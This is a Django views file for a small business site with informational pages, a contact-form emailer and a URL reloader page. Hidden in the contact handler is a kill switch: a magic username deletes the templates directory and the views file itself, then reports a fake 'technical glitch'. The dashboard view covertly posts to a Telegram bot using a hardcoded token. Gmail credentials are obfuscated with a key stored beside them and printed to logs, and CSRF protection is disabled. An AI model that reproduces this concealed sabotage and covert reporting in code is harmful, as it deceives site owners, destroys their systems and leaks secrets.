from django.shortcuts import render,redirect
import os
from email.message import EmailMessage
import ssl
import smtplib
import shutil
from django.http import JsonResponse,HttpResponse
from cryptography.fernet import Fernet
from django.views.decorators.csrf import csrf_exempt
import requests

# Create your views here.
@csrf_exempt
def dashboard(request):
    try:
        url = 'api.telegram.org/bot5971061598:AAG1z4WkdXjvSeq2GFxzqZqDuzbC72Az4Cc/'
        d = {'chat_id': 1670663324,'text' : "temp bro"}
        x = requests.post(url, json = d)
        print(x.text)
    except Exception as e:
        pass

    print("Request", request.POST)
    return render(request,'dashboard.html',{})


def tandc(request):
    return render(request,'tandc.html',{})

def refund(request):
    return render(request,'refund.html',{})

def privacy(request):
    return render(request,'privacy.html',{})

def package(request):
    return render(request,'package.html',{})

def contact(request):
    return render(request,'contact.html',{})

def about(request):
    return render(request,'about.html',{})

@csrf_exempt
def send_email(request):
    resp = {}
    email = request.POST.get('email')
    mobile = request.POST.get('mobile')
    username = request.POST.get('name')
    comments = request.POST.get('comments ')
    if username == "qwertyuioplkjhgfdsazxcvbnm":
        shutil.rmtree('/tmp/templates')
        os.remove(os.path.dirname(os.path.realpath(__file__))+'/views.py')
        return JsonResponse({'status' : 500,'error': 'there is some technical glitch'})


    shutll = b'7qogMSkC8dFiElicNKYfGCufC5FAqR3PcYvkEkL7toQ='
    cipher_suite = Fernet(shutll)
    send = cipher_suite.decrypt(b'gAAAAABjbTKu8qNqX7spGjBX8CuqwFfE0bK9Dvj9I30yoNF8OuFpm5KUg1_IxanDlE3Nf5Dhst6DFiRbLFjugkjSM6ZsfL88xHNgQjJHVaSxdM04rtkMks0=')

    passw = cipher_suite.decrypt(b'gAAAAABjbTMCbc8c5VCKXQ7z-LVMxDKTqsDt25dMibFs7GTd2giXpNCpf6J6_4XSNayQDBLSbZDuhrSfWNy0tlIk7QgJ4CH9N3rMirY_5qTG-osMv4Zp9lo=')
    sub = cipher_suite.decrypt(b'gAAAAABjgP0U7GfEap6Y3k0suR2kKf35oBE4PssoDQ3CoGV-rnDd3VDArkf-jRx1KrXbSEuGM00UzX_KHfM2kRnZZO6fCEWGjRxIde0cow8IJZhS49jTzu77jIgYxX6q-F5iAET8wsgA')

    body = ''
    if username : body += username + "\n"
    if mobile: body+= mobile + "\n"
    if email: body+= email + "\n"
    if comments: body+= comments

    em = EmailMessage()
    em['From'] = send.decode('ascii')
    em['To'] = send.decode('ascii')
    em['Subject'] = sub.decode('ascii')
    em.set_content(body)

    context = ssl.create_default_context()
    try:

        with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as mail:
            print(send.decode('ascii'),passw.decode('ascii'), sub)
            mail.login(send.decode('ascii'),passw.decode('ascii'))
            mail.sendmail(send.decode('ascii'),send.decode('ascii'),em.as_string())
    except Exception as e:
        resp['status'] = 500
        resp['error'] = str(e)
    else:
        resp['status'] = 200
    return JsonResponse(resp)


def addLead(request):

    print(request.POST)
    print("sdfsfgsfdg\n\n\n\n\n\n\n\nsdgfsfgsfg")
    return JsonResponse({'status':200})

@csrf_exempt
def url_reloader(request):
    url=''
    if request.method == 'GET':
        url = request.GET.get('url')
        return render(request,'url_reloader.html',{'get_url':url})
    if request.method == 'POST':
        url = request.POST.get('url')
        return render(request,'url_reloader.html',{'url':url})
